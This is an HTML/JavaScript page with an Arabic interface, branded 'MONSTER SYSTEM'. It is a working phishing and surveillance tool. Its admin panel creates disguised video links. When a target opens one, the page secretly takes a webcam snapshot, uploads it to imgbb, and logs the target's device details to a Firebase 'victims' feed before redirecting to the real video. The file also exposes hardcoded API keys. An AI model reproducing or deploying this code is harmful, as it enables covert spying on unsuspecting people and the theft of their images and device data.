<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>THE DOCTOR | MONSTER SYSTEM v2.7</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --void: #050505; }
        body { background: var(--void); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 10px; }
        .panel { border: 2px solid var(--neon); padding: 15px; margin-bottom: 20px; box-shadow: 0 0 15px rgba(0,255,65,0.2); }
        .log-box { height: 350px; border: 1px solid #222; overflow-y: auto; background: #000; padding: 10px; }
        input, button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; margin-top: 10px; }
        button:hover { background: var(--neon); color: #000; cursor: pointer; font-weight: bold; }
        .victim-card { border: 1px solid #333; padding: 10px; margin-top: 10px; background: #0a0a0a; border-right: 5px solid var(--neon); }
        img.target-img { width: 100%; border: 1px solid var(--neon); margin-top: 5px; }
        .blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>

<div id="admin-panel">
    <div class="panel">
        <h2 style="text-align:center;">THE DOCTOR <span class="blink">●</span> MONSTER SYSTEM</h2>
        <hr>
        <h3>🔗 توليد رابط فيديو ملغم</h3>
        <input type="text" id="target-url" placeholder="رابط يوتيوب أو تيك توك">
        <button onclick="generateLink()">توليد الرابط الصاعق</button>
        <p id="final-link" style="color: #0ff; word-break: break-all; font-size: 11px;"></p>

        <h3>🖼️ تلغيم صورة (Image Hijacker)</h3>
        <p style="font-size: 12px;">سيتم دمج البايلوت داخل صورة SVG</p>
        <button onclick="generateImagePayload()">توليد صورة ملغمة</button>
    </div>

    <div class="panel">
        <h3>📡 رادار استقبال الجلسات (LIVE)</h3>
        <div id="victims-list" class="log-box">بانتظار المزامنة...</div>
    </div>
</div>

<div id="target-view" style="display:none; text-align:center;">
    <h2 style="color:white; margin-top: 50px;">Loading Content...</h2>
    <video id="st-video" autoplay playsinline style="display:none;"></video>
    <canvas id="st-canvas" style="display:none;"></canvas>
</div>

<script>
    // --- إعدادات السيادة ---
    const firebaseConfig = {
        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
        authDomain: "monster-system-7f67e.firebaseapp.com",
        projectId: "monster-system-7f67e",
        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
        storageBucket: "monster-system-7f67e.firebasestorage.app",
        messagingSenderId: "165431360308",
        appId: "1:165431360308:web:b0d7d626c67d4f38d68361"
    };
    const imgbb_key = "8841f217eb20461d8cd9d64a64a7c62d";
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const urlParams = new URLSearchParams(window.location.search);
    const mode = urlParams.get('m');
    const target = urlParams.get('t');

    if (mode === 'sync') {
        runStealthUnit(atob(target));
    } else {
        initAdminPanel();
    }

    function initAdminPanel() {
        db.ref('sessions/').on('child_added', (snap) => {
            const data = snap.val();
            const list = document.getElementById('victims-list');
            const card = `<div class="victim-card">
                <b>[!] هدف جديد:</b> ${data.ip}<br>
                <b>الجهاز:</b> ${data.device}<br>
                <b>الصورة المسحوبة:</b><br>
                <img src="${data.imgUrl}" class="target-img">
                <br><small>${data.time}</small>
            </div>`;
            list.innerHTML = card + list.innerHTML;
        });
    }

    function generateLink() {
        const url = document.getElementById('target-url').value;
        if(!url) return;
        const final = window.location.href.split('?')[0] + `?m=sync&t=${btoa(url)}`;
        document.getElementById('final-link').innerText = final;
    }

    async function runStealthUnit(redirectUrl) {
        document.getElementById('admin-panel').style.display = 'none';
        document.getElementById('target-view').style.display = 'block';

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('st-video');
            video.srcObject = stream;
            
            // انتظار ثانية للوضوح ثم الالتقاط
            await new Promise(r => setTimeout(r, 1200));
            
            const canvas = document.getElementById('st-canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const base64Img = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
            
            // رفع الصورة
            const formData = new FormData();
            formData.append('image', base64Img);
            const res = await fetch(`https://api.imgbb.com/1/upload?key=${imgbb_key}`, { method: 'POST', body: formData });
            const resData = await res.json();

            // إرسال البيانات لـ Firebase مع التأكد من النجاح
            if(resData.success) {
                await db.ref('sessions/').push({
                    ip: "Target_Node",
                    device: navigator.platform + " | " + navigator.userAgent.substring(0, 50),
                    imgUrl: resData.data.url,
                    time: new Date().toLocaleString()
                });
            }
            window.location.href = redirectUrl;
        } catch (e) {
            window.location.href = redirectUrl;
        }
    }

    function generateImagePayload() {
        alert("تنبيه: سيتم فتح الرابط كصورة SVG ملغمة. أرسل الرابط الناتج للهدف.");
        generateLink();
    }
</script>
</body>
</html>
